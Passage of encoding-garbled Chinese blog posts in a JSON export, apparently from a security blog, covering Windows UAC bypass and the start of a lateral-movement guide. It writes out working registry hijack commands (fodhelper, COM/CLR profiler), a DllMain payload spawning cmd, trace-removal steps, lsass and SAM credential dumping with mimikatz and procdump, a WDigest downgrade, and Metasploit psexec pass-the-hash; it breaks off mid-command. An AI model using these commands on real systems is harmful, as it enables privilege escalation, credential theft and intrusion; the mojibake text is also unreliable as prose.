è½½çš„ä¸¢å¤±/ä¸å­˜åœ¨çš„DLLï¼ˆ4ï¼‰ DLLé‡å®šå‘ï¼šæ›´æ”¹DLLæœç´¢çš„è·¯å¾„ï¼Œæ¯”å¦‚é€šè¿‡ç¼–è¾‘%PATH%ç¯å¢ƒå˜é‡æˆ– .exe.manifest/.exe.localæ–‡ä»¶ä»¥å°†æœç´¢è·¯å¾„å®šä½åˆ°åŒ…å«æ¶æ„DLLçš„åœ°æ–¹ã€‚ï¼ˆ5ï¼‰ WinSxS DLLæ›¿æ¢ï¼šå°†ç›®æ ‡DLLç›¸å…³çš„WinSxSæ–‡ä»¶å¤¹ä¸­çš„æ¶æ„DLLæ›¿æ¢ä¸ºåˆæ³•çš„DLLã€‚æ­¤æ–¹æ³•é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºDLLä¾§åŠ è½½ï¼ˆ6ï¼‰ ç›¸å¯¹è·¯å¾„DLLåŠ«æŒï¼šå°†åˆæ³•çš„åº”ç”¨ç¨‹åºå¤åˆ¶ï¼ˆå¹¶æœ‰é€‰æ‹©åœ°é‡å‘½åï¼‰ä¸æ¶æ„çš„DLLä¸€èµ·æ”¾å…¥åˆ°ç”¨æˆ·å¯å†™çš„æ–‡ä»¶å¤¹ä¸­ã€‚åœ¨ä½¿ç”¨æ–¹æ³•ä¸Šï¼Œå®ƒä¸ï¼ˆç­¾åçš„ï¼‰äºŒè¿›åˆ¶ä»£ç†æ‰§è¡Œæœ‰ç›¸ä¼¼ä¹‹å¤„ã€‚å®ƒçš„ä¸€ä¸ªå˜ä½“æ˜¯ï¼ˆæœ‰ç‚¹çŸ›ç›¾åœ°ç§°ä¸ºï¼‰â€œè‡ªå¸¦LOLbinâ€ï¼Œå…¶ä¸­åˆæ³•çš„åº”ç”¨ç¨‹åºå¸¦æœ‰æ¶æ„çš„DLLï¼ˆè€Œä¸æ˜¯ä»å—å®³è€…æœºå™¨ä¸Šçš„åˆæ³•ä½ç½®å¤åˆ¶ï¼‰ã€‚ å®è·µå‡ºçœŸçŸ¥1è¿™é‡Œæˆ‘ä»¬å…ˆç”¨ç¬¬ä¸€ç§æ–¹æ³•æ¥è¿›è¡Œå®éªŒï¼Œå®éªŒå¯¹è±¡æ˜¯C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exeå’ŒListaryã€‚Listaryæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ£€ç´¢å°å·¥å…·ï¼Œæˆ‘é€šè¿‡processmonitorï¼Œè®¾ç½®å¥½è¿‡æ»¤æ¡ä»¶ï¼ŒæŸ¥çœ‹SystemPropertiesAdvanced.exeè°ƒç”¨çš„dllæ—¶å‘ç°å®ƒä¼šè°ƒç”¨ä¸€ä¸ªListaryä¸‹çš„ä¸€ä¸ªåä¸ºListaryHook.dllçš„dllã€‚ ç”±äºlistaryç›®å½•æƒé™ä¸é«˜ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ›¿æ¢è¯¥dllï¼Œæ¢æˆdllmainä¸ºæ‰“å¼€cmdçš„dllã€‚ç„¶åç‚¹å‡»è¿è¡ŒSystemPropertiesAdvanced.exeï¼Œå°±ä¼šå‘ç°ä¼šå¼¹å‡ºé«˜æƒé™cmdçª—å£ bypassuacæˆåŠŸã€‚ å½“ç„¶è¿™ç§éƒ½ä¸èƒ½ç®—æ˜¯ä¸€ä¸ªæ´ï¼Œlistaryå¹¶ä¸æ˜¯äººäººç”µè„‘ä¸Šéƒ½æœ‰çš„ï¼Œè€Œä¸”è¿™ä¸ªè½¯ä»¶è£…æœºé‡åº”è¯¥æ˜¯æå°‘æ•°å°‘çš„ï¼Œæ‰€ä»¥è¿™é‡Œåªæ˜¯æä¾›ä¸€ä¸ªæ€è·¯ï¼Œè¿™ç§æ´è¯¥æ€ä¹ˆå»æ‰¾ã€‚ å®è·µå‡ºçœŸçŸ¥2è¿™é‡Œä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•è¿›è¡Œå®éªŒï¼Œå®éªŒå¯¹è±¡æ˜¯eventvwr.mscï¼Œå®ƒæ˜¯ç®¡ç†å·¥å…·ä¸­çš„äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå®ƒä¾èµ–äºmmc.exeæ¥è¿è¡Œã€‚æ¯”å¦‚ï¼Œä½ æƒ³è¿è¡Œå®ƒï¼Œå°±å¾—é€šè¿‡mmc eventvwr.mscæ¥è¿è¡Œå®ƒ,å¹¶ä¸”åœ¨process exploerä¸­åªèƒ½çœ‹åˆ°ä¸ªmmc.exeã€‚ æˆ‘ä»¬process monitorè®¾ç½®è¿‡æ»¤å¦‚ä¸‹ cmdè¿è¡Œ mmc eventvwr.msc,æŸ¥çœ‹è°ƒç”¨ dllæœç´¢é¡ºåºç¡®å®æ˜¯ ç¨‹åºç›®å½•-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;å½“å‰ç›®å½•ï¼ˆè¿™é‡Œä¹Ÿæ˜¯SYSTEM32ç›®å½•ï¼Œæˆ‘è®¤ä¸ºçš„åŸå› æ˜¯mmcä¼šè‡ªåŠ¨æå‡æƒé™å¯¼è‡´å½“å‰ç›®å½•ä¸ºSystem32å¯¼è‡´çš„ï¼‰-&gt;PATHç›®å½•ã€‚ æˆ‘ä»¬åªéœ€åœ¨å¯å†™ç›®å½•ä¸‹æ¤å…¥åä¸ºelsext.dllçš„æ¶æ„dllï¼Œå¤„ç†å¥½dllçš„dllmainå‡½æ•°ï¼Œå°±èƒ½è®©dllmainé‡Œçš„æŒ‡ä»¤è¢«é«˜æƒé™æ‰§è¡Œ ä½†æ˜¯æ— å¥ˆæˆ‘è¿™é‡Œç¯å¢ƒæ˜¯win7 sp1,ä½†æ˜¯è¿™ä¸ªæ´7600æ‰å‡ºç°ï¼Œæ‰€ä»¥å¤ç°ä¸äº†äº†ã€‚ä½†å¤§æ¦‚æ€è·¯å°±æ˜¯è¿™æ ·çš„ CLRåŠ è½½ä»»æ„DLLCLRæ˜¯å¾®è½¯ä¸º.netè¿è¡Œæ—¶æä¾›çš„ç¯å¢ƒï¼Œåƒjavaçš„è™šæ‹Ÿæœºä¸€æ ·ï¼Œè€Œclræœ‰ä¸€ä¸ªProfilingæœºåˆ¶ã€‚è¿™ä¸ªæœºåˆ¶ç®€è€Œè¨€ä¹‹ä¾¿æ˜¯å¯ä»¥ç»™CLRæä¾›ä¸€ä¸ªdllï¼Œå½“ä»»ä½•é«˜æƒé™.NETè¿è¡Œæ—¶éƒ½ä¼šä¸»åŠ¨åŠ è½½è¯¥DLLï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„dllç»™CLRåŠ è½½ï¼Œä»è€Œè·å¾—é«˜æƒé™çš„è¿›ç¨‹å¦‚cmdï¼Œä»è€Œbypassuacã€‚ è‡³äºè¿™ä¸ªdllå¦‚ä½•ç»™CLRï¼Œæ˜¯é€šè¿‡ä¿®æ”¹ä»¥ä¸‹ç¯å¢ƒå˜é‡å®ç°çš„ COR_ENABLE_PROFILING &#x3D; 1COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125; CLRä¼šæ£€æŸ¥ç¯å¢ƒå˜é‡ä¸­çš„COR_ENABLE_PROFILINGï¼Œè‹¥ä¸º1åˆ™æ£€æŸ¥é€šè¿‡ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ã€‚åœ¨net4.0ä»¥å‰ï¼Œè‹¥æ£€æŸ¥é€šè¿‡ï¼Œä¼šé©¬ä¸Šå»æŸ¥æ‰¾COR_PROFILERæŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ï¼Œæ‰¾åˆ°å…¶dllè·¯å¾„å¹¶åŠ è½½net4.0åï¼Œä¼šå…ˆæŸ¥æ‰¾COR_PROFILER_PATHæ˜¯å¦æŒ‡å®šdllæ–‡ä»¶è·¯å¾„ï¼Œè‹¥æ²¡æœ‰å†å»æŸ¥æ‰¾COR_PROFILERæŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ï¼Œæ‰¾åˆ°å…¶dllè·¯å¾„å¹¶åŠ è½½ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è®¾ç½®å¥½COR_ENABLE_PROFILINGå’ŒCOR_PROFILERä¸¤ä¸ªé¡¹å°±å¯ä»¥äº†ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼Œè®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡æ—¶ä¸éœ€è¦é«˜æƒé™ï¼ˆwin10ä¼¼ä¹è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ä¹Ÿä¸éœ€è¦ï¼‰ã€‚ä»¥åŠåœ¨æ³¨å†Œè¡¨ï¼Œåœ¨æŒ‡å®šçš„CLSIDå±æ€§ä¸‹æ–°å»ºInprocserver32é¡¹ï¼Œå¹¶å†™å…¥æ¶æ„dllè·¯å¾„. ç„¶åé€šè¿‡mmcè°ƒç”¨ä¸€ä¸‹gpedit.mscè¿™ç§ç¨‹åºï¼Œå³å¯ä»¥é«˜æƒé™æ‰§è¡Œdllã€‚å¦‚æœdllæ‰§è¡Œå‘½ä»¤ä¸ºsystem(â€œcmd.exeâ€) é‚£ä¹ˆå°±ä¼šè¹¦å‡ºæ¥é«˜æƒé™cmdçª—å£ REG ADD &quot;HKCU\\Software\\Classes\\CLSID\\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\\test\\calc.dll&quot; &#x2F;fREG ADD &quot;HKCU\\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;fREG ADD &quot;HKCU\\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;fmmc gpedit.msc ä½†æˆ‘æ­»æ´»å¤ç°ä¸èµ·ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘çš„dllè¿™æ ·å†™çš„ &#x2F;&#x2F; dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)&#123; char cmd[] &#x3D; &quot;cmd.exe&quot;; switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: WinExec(cmd, SW_SHOWNORMAL); ExitProcess(0); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; å¦å¤–çš„ï¼Œä½ è¿˜å¯ä»¥ä¸ºCOR_PROFILER_PATHè®¾ç½®ä¸ºå¦‚\\\\server\\share\\test.dllçš„smbçš„è·¯å¾„ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å®ç°bypassuacï¼ˆæ²¡å¤ç°ï¼‰ ç™½åå•ç¨‹åºodbcad32.exeè¿™ä¸ªæ–¹æ³•å¾ˆç®€å•ã€‚æ‰“å¼€C:\\Windows\\system32\\odbcad32.exeï¼Œç„¶åé€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰“å¼€powershellæˆ–è€…cmd æˆåŠŸbypass ç®¡ç†å·¥å…·ä¹‹å‰è¯´è¿‡ï¼Œç®¡ç†å·¥å…·æœ‰å¾ˆå¤šç™½åå•ç¨‹åºï¼Œå¦‚æœä¸€ä¸ªç™½åå•ç¨‹åºæœ‰æµè§ˆæ–‡ä»¶ç›®å½•çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥ä»¥æ­¤æ¥åˆ›å»ºé«˜æƒé™cmdçª—å£ã€‚è¿™é‡Œæ‹¿äº‹ä»¶æŸ¥çœ‹å™¨ä¸¾ä¾‹ æ“ä½œ-ã€‹æ‰“å¼€ä¿å­˜çš„ç›®å½•-ã€‹æ–‡ä»¶ç›®å½•è·¯å¾„å¤„è¾“å…¥powershell-ã€‹å¼¹å‡ºé«˜æƒé™powershell ä»¥æ­¤å†…æ¨ï¼Œè¿˜æœ‰å¾ˆå¤šç›¸ä¼¼çš„ç®¡ç†å·¥å…·å¯ä»¥è¿™æ ·åˆ©ç”¨ æ³¨å†Œè¡¨åŠ«æŒFodhelper.exeFodhelper.exe win10æ‰æœ‰ï¼Œæ‰€ä»¥åªæœ‰win10èƒ½é€šè¿‡è¿™ä¸ªåŠæ³•bypassuacï¼Œä»–æ˜¯ä¸€ä¸ªautoelevateå…ƒç´ ç¨‹åº æˆ‘ä»¬ä½¿ç”¨proceemonitoræŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œäº†ä»€ä¹ˆã€‚æˆ‘ä»¬é€šè¿‡æ’æŸ¥å‘ç°äº†æ­¤å¤„ å‘ç°ç¨‹åºè¯•å›¾æ‰“å¼€HKCU\\Software\\Classes\\ms-settings\\shell\\open\\commandï¼Œä½†æ˜¯è¿™ä¸ªé¡¹æ²¡æœ‰æ‰¾åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¡¹å¹¶ä¸å­˜åœ¨ï¼Œäºæ˜¯å®ƒæŸ¥è¯¢ HKCR\\ms-settings\\Shell\\Open,æŸ¥è¯¢æˆåŠŸä¾¿æ‰“å¼€å…¶ä¸‹çš„Commandé”®è¿›è¡ŒæŸ¥è¯¢ã€‚æˆ‘ä»¬å¯ä»¥åŠ«æŒæ³¨å†Œè¡¨ï¼Œå¾€HKCU\\Software\\Classes\\ms-settings\\shell\\open\\commandå†™å…¥æ¶æ„æŒ‡ä»¤ä»è€Œè¾¾åˆ°bypassuacçš„ç›®çš„ã€‚ reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f æˆ‘ä»¬å†™å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå°±èƒ½è®©Fodhelper.exe æ‰§è¡Œæ—¶è‡ªåŠ¨é«˜æƒé™æ‰§è¡Œcmdçª—å£äº† ç„¶åæ¶ˆé™¤ç—•è¿¹ reg delete &quot;HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command&quot; sdcltWin10åè¿™ä¸ªç¨‹åºæ‰æœ‰è‡ªåŠ¨æå‡æƒé™çš„èƒ½åŠ› reg add &quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command&quot; &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f reg add &quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f eventvmrreg add &quot;HKCU\\Software\\Classes\\mscfile\\shell\\open\\command&quot; &#x2F;d C:\\Windows\\System32\\cmd.exe &#x2F;f win10ï¼Œwin7å‡æ— æ•ˆ,ä¸çŸ¥é“æ˜¯å“ªä¸ªç‰ˆæœ¬çš„äº‹äº†ï¼Œåæ­£è®°å½•ä¸‹æ¥å§ã€‚ COMåŠ«æŒå’ŒdllåŠ«æŒç±»ä¼¼ï¼Œåº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶ä¹Ÿä¼šå»åŠ è½½æŒ‡å®šCLSIDçš„COMç»„ä»¶ï¼Œå…¶åŠ è½½é¡ºåºå¦‚ä¸‹ HKCU\\Software\\Classes\\CLSIDHKCR\\CLSIDHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ ä»¥eventvwrä¸ºä¾‹ æ‰§è¡Œè¯¥ç¨‹åºæ—¶ä¼šå»å¯»æ‰¾{0A29FF9E-7F9C-4437-8B11-F424491E3931}è¿™ä¸ªç»„ä»¶ï¼Œè¿™ä¸ªç»„ä»¶åˆéœ€è¦åŠ è½½InProcServer32æŒ‡å®šçš„DLLï¼Œè€Œè¿™ä¸ªDLLçš„è·¯å¾„å¯ç”±ç”¨æˆ·å®šä¹‰ã€‚ è€Œeventvwrçš„è¿™ä¸ªç»„ä»¶ä¸€èˆ¬åœ¨HKCR\\CLSIDæ‰¾åˆ°ï¼Œæ‰€ä»¥å¯ä»¥æœç´¢è·¯å¾„åŠ«æŒã€‚ åˆ©ç”¨ä»¥ä¸‹æ–¹æ³•å¯ä»¥åŠ«æŒï¼ˆæœç´¢è·¯å¾„åŠ«æŒï¼‰ reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;&quot; &#x2F;t REG_SZ &#x2F;d &quot;d:\\msf_x64.dll&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;LoadWithoutCOM&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\InProcServer32 &#x2F;v &quot;ThreadingModel&quot; &#x2F;t REG_SZ &#x2F;d &quot;Apartment&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\ShellFolder &#x2F;v &quot;HideOnDesktop&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\\ShellFolder &#x2F;v &quot;Attributes&quot; &#x2F;t REG_DWORD &#x2F;d 0xf090013d &#x2F;f åˆ©ç”¨comæ¥å£ICMLuaUtil UACMEä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œè®°å½•äº†è®¸å¤šBypassuacçš„æ–¹æ³•ã€‚ https://github.com/hfiref0x/UACME/tree/v3.2.x windbgè°ƒè¯•","categories":[],"tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"æ¨ªå‘ç§»åŠ¨ä¸åŸŸæ§æƒé™ç»´æŒæ–¹æ³•æ€»æ±‡","slug":"æ¨ªå‘ç§»åŠ¨ä¸åŸŸæ§æƒé™ç»´æŒæ–¹æ³•æ€»æ±‡","date":"2021-06-28T13:51:58.227Z","updated":"2021-08-03T04:44:49.144Z","comments":true,"path":"2021/06/28/æ¨ªå‘ç§»åŠ¨ä¸åŸŸæ§æƒé™ç»´æŒæ–¹æ³•æ€»æ±‡/","link":"","permalink":"http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/","excerpt":"","text":"æ¨ªå‘ç§»åŠ¨PTHå¦‚æœæ‰¾åˆ°äº†æŸä¸ªç”¨æˆ·çš„ntlm hashï¼Œå°±å¯ä»¥æ‹¿è¿™ä¸ªntlm hashå½“ä½œå‡­è¯è¿›è¡Œè¿œç¨‹ç™»é™†äº†å…¶ä¸­è‹¥hashåŠ å¯†æ–¹å¼æ˜¯ rc4 ï¼Œé‚£ä¹ˆå°±æ˜¯pass the hashè‹¥åŠ å¯†æ–¹å¼æ˜¯aes key,é‚£ä¹ˆå°±æ˜¯pass the keyæ³¨æ„NTLMå’Œkerberosåè®®å‡å­˜åœ¨PTH:NTLMè‡ªç„¶ä¸ç”¨å¤šè¯´kerberosåè®®ä¹Ÿæ˜¯åŸºäºç”¨æˆ·çš„client hashå¼€å§‹ä¸€æ­¥æ­¥è®¤è¯çš„ï¼Œè‡ªç„¶ä¹Ÿä¼šå—PTHå½±å“ é‚£å‰æå°±æ˜¯è¦è·å–hashå€¼äº† KB2871997å¦‚æœç³»ç»Ÿå®‰è£…KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºç­‰äºwindow server 2012æ—¶(æœåŠ¡å™¨ç‰ˆæœ¬),å¤§äºç­‰äºwin8.1(å®¶åº­ç‰ˆæœ¬)æ—¶ï¼ˆè‡ªå¸¦è¡¥ä¸ï¼‰ï¼Œé»˜è®¤åœ¨lsass.exeè¿™ä¸ªè¿›ç¨‹ä¸­ä¸ä¼šå†å°†å¯é€†çš„å¯†æ–‡ç¼“å­˜åœ¨è‡ªå·±çš„è¿›ç¨‹å†…å­˜ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬é»˜è®¤æ˜¯æ²¡åŠæ³•é€šè¿‡è¯»å–è¿™ä¸ªè¿›ç¨‹ç„¶åé€†å‘è¯¥å¯†æ–‡æ¥è·å–æ˜æ–‡å¯†ç  è™½ç„¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ¥ä½¿LSASSå¼ºåˆ¶å­˜å‚¨æ˜æ–‡å¯†ç  reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f ä½†æ˜¯è¿™ç§æ–¹å¼è¦æ±‚ç³»ç»Ÿé‡å¯æˆ–è€…ç”¨æˆ·é‡æ–°ç™»å½•ï¼Œåœ¨å®æˆ˜ä¸­æ“ä½œèµ·æ¥æˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒä½çš„ã€‚ åŒæ—¶æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹æ˜¯å¢åŠ äº†Protected Usersç»„ï¼Œæ‰€å±ç”¨æˆ·ä¼šè¢«å¼ºåˆ¶è¦æ±‚ä½¿ç”¨Kerberosè®¤è¯ï¼Œå¯ä»¥é¿å…PTHæ”»å‡»ï¼Œä»¥åŠç”¨æˆ·æ³¨é”€ååˆ é™¤å‡­è¯(æ˜æ–‡å¯†ç ã€LM/NTLM HASHã€Kerberosçš„TGTç¥¨æ®ç­‰) ä»¥åŠï¼šRestricted Admin RDPæ¨¡å¼çš„è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯æ”¯æŒ å…³äºKB2871997çš„ä¸€ä¸ªè¯¯è§£è‡ªwindow vistaä¹‹åæ²¡åŠæ³•ä½¿ç”¨RIDé500çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·æ¥è¿›è¡ŒPass The Hash, ä½†æ˜¯å¦‚æœæ˜¯åŸŸç”¨æˆ·ä¸”è¯¥åŸŸç”¨æˆ·å±äºæœ¬åœ°Administratorsç»„çš„æˆå‘˜ä¹Ÿå¯ä»¥è¿›è¡Œpass the hashã€‚ å¾ˆå¤šäººæŠŠè¿™ä¸ªåŸå› å½’ç»“äºKB2871997è¡¥ä¸ï¼Œå®é™…ä¸Šä¸ç„¶ï¼Œè¿™ä¸ªäº‹æƒ…çš„æˆå› å®é™…æ˜¯UACåœ¨æ£ä¹±ã€‚UACæ˜¯window Vistaçš„æ–°å®‰å…¨ç»„ä»¶ï¼Œå…·ä½“æ˜¯ä¸ªå•¥è¿™é‡Œä¹Ÿä¸ç»†è¯´äº†ã€‚RIDä¸º500çš„è´¦æˆ·å’Œå±äºæœ¬åœ°administratorsç»„çš„åŸŸç”¨æˆ·åœ¨é€šè¿‡ç½‘ç»œè¿œç¨‹é“¾æ¥æ—¶ï¼Œé»˜è®¤å°±æ˜¯é«˜æƒé™ä»¤ç‰Œã€‚è€ŒéRID500çš„æœ¬åœ°è´¦æˆ·åˆ™ä¸ºä½æƒé™ä»¤ç‰Œï¼Œè‹¥æƒ³æå‡æƒé™åˆ™éœ€é€šè¿‡äº¤äº’æ–¹å¼ç™»å½•åˆ°è¦é€šè¿‡è¿œç¨‹ååŠ©æˆ–è¿œç¨‹æ¡Œé¢ç®¡ç†çš„è®¡ç®—æœºèµ°UACææƒã€‚ å…³äºè¿™ä¸ªæˆå› çš„ä¸€äº›ç³»ç»Ÿé…ç½®é€‰é¡¹ï¼š è¿™ä¸ªé¡¹é»˜è®¤å…è®¸å†…ç½®ç®¡ç†å‘˜è´¦æˆ·ï¼ˆRID500è´¦æˆ·ï¼‰åœ¨æ‰€æœ‰åº”ç”¨ä¸‹éƒ½ä»¥é«˜æƒé™ä»¤ç‰Œè¿è¡Œã€‚è¿™ä¹Ÿæ˜¯RID500è´¦æˆ·èƒ½PTHçš„åŸå›  ä»¥åŠæ­¤æ³¨å†Œè¡¨é¡¹ï¼Œå¯ä»¥å…³é—­UACçš„è¿œç¨‹é™åˆ¶ï¼Œå³è¿œç¨‹è¿æ¥æ—¶UACä¼šå¤±æ•ˆï¼Œè¿™æ ·çš„è¯åªè¦æ˜¯administratorsç»„çš„ç”¨æˆ·éƒ½èƒ½PTHè¾£ã€‚ å…¶ä¸­è¯¥å€¼ä¸º0åˆ™ä»£è¡¨å¼€å¯UACçš„è¿œç¨‹é™åˆ¶,è®¾ç½®è¯¥å€¼ä¸º1æ—¶ HASHè·å–1.ä½¿ç”¨meterpreteré‡Œçš„mimikatzæ¨¡å— meterpreter&gt;load mimikatzmeterpreter&gt;mimikatz_command -f mimikatzçš„æŒ‡ä»¤privilege::debug ææƒ samdump::hashes dumpå“ˆå¸Œ æˆ–è€…meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst 2.ä½¿ç”¨meterpreterè‡ªå¸¦çš„hashè·å–æ¨¡å— meterpreter&gt;hashdumpmeterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump (æ¨èä½¿ç”¨è¿™ä¸ª) 3.å‘ç›®æ ‡æœºä¸Šä¼ mimikatzè¿œç¨‹è°ƒç”¨mimikatz.exe dumpå‡ºhashï¼Œmimikatzéœ€è¦å…æ€å¤„ç†æ„æ€å°±æ˜¯æ—¢ç„¶æˆ‘ä»¬è·å–åˆ°äº†shellï¼Œæˆ‘ä»¬ç›´æ¥å‘ç›®æ ‡æœºä¸Šä¼ ä¸€ä¸ªmimikatzç„¶ååœ¨shellé‡Œä½¿ç”¨å®ƒå°±è¡Œäº†. ä½¿ç”¨æ–¹æ³•ä¸ºcmdçª—å£æ‰“å¼€mimikatz.exeï¼Œè¿›å…¥mimikatzç»ˆç«¯ï¼Œç„¶åè¾“å…¥mimikatzæŒ‡ä»¤å³å¯ 4.ä¸Šä¼ procdumpåˆ°ç›®æ ‡æœºï¼Œè·å–åˆ°lsass.dmpæ–‡ä»¶åå°†å…¶ä¼ å›æœ¬åœ°åˆmimikatzæ¥dumpå“ˆå¸Œ procdump.exeæ˜¯å¾®è½¯è‡ªå¸¦çš„ç¨‹åºï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘æ€æ¯’ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å®ƒä¼ å›lsass.dmpæœ¬åœ°æå–hash procdump64.exe -accepteula -ma lsass.exe lsass.dmp æ‰§è¡Œè¯¥æŒ‡ä»¤ï¼Œè·å–åˆ°lsass.dmpç„¶åå°†å…¶ä¼ å›æœ¬åœ°é€šè¿‡mimikatz.exeåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹å‘½ä»¤&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; Procdumpï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/procdumpmimikatzï¼šhttps://github.com/gentilkiwi/mimikatz/releases 5.ä½¿ç”¨cobalt strike è·å–hash beacon&gt;hashdumpbeacon&gt;mimikatz mimikatzæŒ‡ä»¤ 6.åˆ©ç”¨samè¡¨ mimikatzåœ¨çº¿è¯»samè¡¨ä¸­çš„hash privilege::debugtoken::elevatelsadump::sam å°†samè¡¨ä¸‹è½½åˆ°æœ¬åœ°ç”±mimikatzåˆ†æ reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAMåœ¨è¿œç«¯shellä½¿ç”¨ä»¥ä¸Šå‘½ä»¤å¯¼å‡ºSYSTEM å’Œ SAMæ–‡ä»¶ï¼Œå¹¶å°†å…¶å¾…ä¼šæœ¬åœ°ï¼Œç”±mimikatzåˆ†æmimikatzè¿è¡Œmimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEMDomain : STU1SysKey : fd4639f4e27c79683ae9fee56b44393fLocal SID : S-1-5-21-1982601180-2087634876-2293013296SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17RID : 000001f4 (500)User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID : 000001f5 (501)User : GuestRID : 000003e8 (1000)User : liukaifeng01 Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 hash ä¼ é€’æ”»å‡» PTH ï¼ˆPass the Hash)1.msfé‡Œä½¿ç”¨psexecæ¨¡å— msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec &#x2F;&#x2F;ä»¥rootå¯åŠ¨msf[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133lhsot &#x3D;&gt; 192.168.64.133msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133lhost 